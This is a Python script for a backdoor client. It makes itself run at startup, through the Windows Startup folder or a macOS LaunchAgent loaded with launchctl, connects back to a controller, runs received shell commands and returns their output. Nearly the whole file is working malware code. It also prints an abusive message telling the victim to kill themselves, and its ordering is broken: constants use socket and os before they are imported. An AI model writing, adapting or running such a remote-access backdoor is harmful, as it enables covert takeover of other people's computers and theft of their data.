#!/usr/bin/env python3
HOST = socket.gethostbyname(socket.gethostname())
PORT = 9999
USER_NAME = os.getlogin()

import os
import socket
import subprocess
import sys
import shutil

from time import sleep


def add_to_startup_win(file_path=""):
    if file_path == "":
        file_path = "C:/Users/%s/client_config.pyw" % USER_NAME
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    #print(os.path.exists(file_path) , os.path.isfile(bat_path))

    if os.path.exists(file_path) or os.path.isfile(bat_path): return
    shutil.copy(__file__, "C:/Users/%s/client_config.pyw" % USER_NAME)

    with open(bat_path + '\\' + "client_launcher.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


def add_to_startup_mac(file_path=""):
    plist_path = "~/Library/LaunchAgents/client_launch.plist"

    if os.path.isfile(plist_path) or os.path.isfile("~/Library/LaunchAgents/client_launcher.pyw"): return

    shutil.copy(__file__, "~/Library/LaunchAgents/client_launcher.py")
    with open(plist_path, "a") as file:
        file.write("""<?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                        <plist version="1.0">
                        <dict>
                            <key>Label</key>
                            <string>client.launcher</string>
                            <key>ProgramArguments</key>
                            <array>
                                <string>~/Library/LaunchAgents/client_launcher.py</string>
                                <string></string>
                            </array>
                            <key>StartInterval</key>
                            <integer>1800</integer>
                        </dict>
                        </plist>""")
    
    os.system(f"launchctl load -w {plist_path}")


try:
    if os.name == "nt":
        add_to_startup_win()
    elif os.name == "posix":
        add_to_startup_mac()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connected = False
    while not connected:
        try:
            s.connect((HOST, PORT))
            connected = True
        except:
            sleep(0.5)

    print("if you see this you can go kill yourself xD")

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode(
                "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmd.stdout.flush()
            cmd.stderr.flush()
            cmd.stdin.flush()
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str))
        s.send(str.encode(" "))

    s.close()
except socket.error:
    sys.exit()
except Exception as msg:
    s.send(str.encode(msg))